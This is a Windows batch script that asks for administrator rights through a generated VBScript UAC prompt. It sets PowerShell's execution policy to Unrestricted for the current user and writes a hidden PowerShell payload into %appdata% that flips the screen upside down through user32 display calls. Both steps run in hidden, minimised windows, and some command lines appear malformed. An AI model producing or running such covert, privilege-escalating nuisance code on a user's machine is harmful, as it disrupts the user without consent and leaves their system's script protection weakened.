@echo off
cls
:: BatchGotAdmin
 :-------------------------------------
 REM  --> Check for permissions
 >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
     echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )

:UACPrompt
     echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
     echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
     exit /b

:gotAdmin
     if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
@echo off
cls
mkdir %appdata%\ren
del /s /q %appdata%\ren
cd %appdata%\ren
powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c
PowerShell.exe -NoProfile -Command "Set-ExecutionPolicy Unrestricted -Scope CurrentUser"
powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser
echo Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force > snake0071.ps1
echo Add-Type -TypeDefinition @^"                                                                                                                                       >> snake0071.ps1
echo using System;                                                                                                                                                       >> snake0071.ps1
echo using System.Runtime.InteropServices;                                                                                                                               >> snake0071.ps1
echo public class DisplaySettings                                                                                                                                        >> snake0071.ps1
echo {                                                                                                                                                                   >> snake0071.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> snake0071.ps1
echo     public static extern bool EnumDisplaySettings(string deviceName, int modeNum, ref DEVMODE devMode);                                                             >> snake0071.ps1
echo     [DllImport("user32.dll")]                                                                                                                                       >> snake0071.ps1
echo     public static extern int ChangeDisplaySettings(ref DEVMODE devMode, int flags);                                                                                 >> snake0071.ps1
echo     [StructLayout(LayoutKind.Sequential)]                                                                                                                           >> snake0071.ps1
echo     public struct DEVMODE                                                                                                                                           >> snake0071.ps1
echo     {                                                                                                                                                               >> snake0071.ps1
echo         private const int CCHDEVICENAME = 32;                                                                                                                       >> snake0071.ps1
echo         private const int DM_PELSWIDTH = 0x80000;                                                                                                                   >> snake0071.ps1
echo         private const int DM_PELSHEIGHT = 0x100000;                                                                                                                 >> snake0071.ps1
echo         [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHDEVICENAME)]                                                                                             >> snake0071.ps1
echo         public string dmDeviceName;                                                                                                                                 >> snake0071.ps1
echo         public ushort dmSpecVersion;                                                                                                                                >> snake0071.ps1
echo         public ushort dmDriverVersion;                                                                                                                              >> snake0071.ps1
echo         public ushort dmSize;                                                                                                                                       >> snake0071.ps1
echo         public ushort dmDriverExtra;                                                                                                                                >> snake0071.ps1
echo         public uint dmFields;                                                                                                                                       >> snake0071.ps1
echo         public int dmPositionX;                                                                                                                                     >> snake0071.ps1
echo         public int dmPositionY;                                                                                                                                     >> snake0071.ps1
echo         public int dmDisplayOrientation;                                                                                                                            >> snake0071.ps1
echo         public int dmDisplayFixedOutput;                                                                                                                            >> snake0071.ps1
echo         public short dmColor;                                                                                                                                       >> snake0071.ps1
echo         public short dmDuplex;                                                                                                                                      >> snake0071.ps1
echo         public short dmYResolution;                                                                                                                                 >> snake0071.ps1
echo         public short dmTTOption;                                                                                                                                    >> snake0071.ps1
echo         public short dmCollate;                                                                                                                                     >> snake0071.ps1
echo         [MarshalAs(UnmanagedType.ByValTStr, SizeConst = CCHDEVICENAME)]                                                                                             >> snake0071.ps1
echo         public string dmFormName;                                                                                                                                   >> snake0071.ps1
echo         public ushort dmLogPixels;                                                                                                                                  >> snake0071.ps1
echo         public uint dmBitsPerPel;                                                                                                                                   >> snake0071.ps1
echo         public uint dmPelsWidth;                                                                                                                                    >> snake0071.ps1
echo         public uint dmPelsHeight;                                                                                                                                   >> snake0071.ps1
echo         public uint dmDisplayFlags;                                                                                                                                 >> snake0071.ps1
echo         public uint dmDisplayFrequency;                                                                                                                             >> snake0071.ps1
echo         public uint dmICMMethod;                                                                                                                                    >> snake0071.ps1
echo         public uint dmICMIntent;                                                                                                                                    >> snake0071.ps1
echo         public uint dmMediaType;                                                                                                                                    >> snake0071.ps1
echo         public uint dmDitherType;                                                                                                                                   >> snake0071.ps1
echo         public uint dmReserved1;                                                                                                                                    >> snake0071.ps1
echo         public uint dmReserved2;                                                                                                                                    >> snake0071.ps1
echo         public uint dmPanningWidth;                                                                                                                                 >> snake0071.ps1
echo         public uint dmPanningHeight;                                                                                                                                >> snake0071.ps1
echo     }                                                                                                                                                               >> snake0071.ps1
echo     public static void InvertScreenOrientation()                                                                                                                    >> snake0071.ps1
echo     {                                                                                                                                                               >> snake0071.ps1
echo         DEVMODE devMode = new DEVMODE();                                                                                                                            >> snake0071.ps1
echo         devMode.dmSize = (ushort)Marshal.SizeOf(typeof(DEVMODE));                                                                                                   >> snake0071.ps1
echo         devMode.dmFields = 0x00000800;                                                                                                                              >> snake0071.ps1
echo         if (EnumDisplaySettings(null, -1, ref devMode))                                                                                                             >> snake0071.ps1
echo         {                                                                                                                                                           >> snake0071.ps1
echo             if (devMode.dmDisplayOrientation == 0)                                                                                                                  >> snake0071.ps1
echo             {                                                                                                                                                       >> snake0071.ps1
echo                 devMode.dmDisplayOrientation = 2;                                                                                                                   >> snake0071.ps1
echo             }                                                                                                                                                       >> snake0071.ps1
echo             else if (devMode.dmDisplayOrientation == 2)                                                                                                             >> snake0071.ps1
echo             {                                                                                                                                                       >> snake0071.ps1
echo                 devMode.dmDisplayOrientation = 0;                                                                                                                   >> snake0071.ps1
echo             }                                                                                                                                                       >> snake0071.ps1
echo             ChangeDisplaySettings(ref devMode, 0x00000001);                                                                                                         >> snake0071.ps1
echo         }                                                                                                                                                           >> snake0071.ps1
echo     }                                                                                                                                                               >> snake0071.ps1
echo }                                                                                                                                                                   >> snake0071.ps1
echo ^"@                                                                                                                                                                 >> snake0071.ps1
echo [DisplaySettings]::InvertScreenOrientation()                                                                                                                        >> snake0071.ps1
echo Set-ExecutionPolicy -Scope Process -ExecutionPolicy Default -Force >> snake0071.ps1
echo cd %appdata%\ren\ > 9f.bat
echo powershell -windowstyle hidden -command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c '" >> 9f.bat
set "ea=%appdata%\ren\snake0071.ps1"
echo PowerShell.exe -NoProfile -ExecutionPolicy Bypass -Command "& '%ea%'" >> 9f.bat

start /min 9f.bat


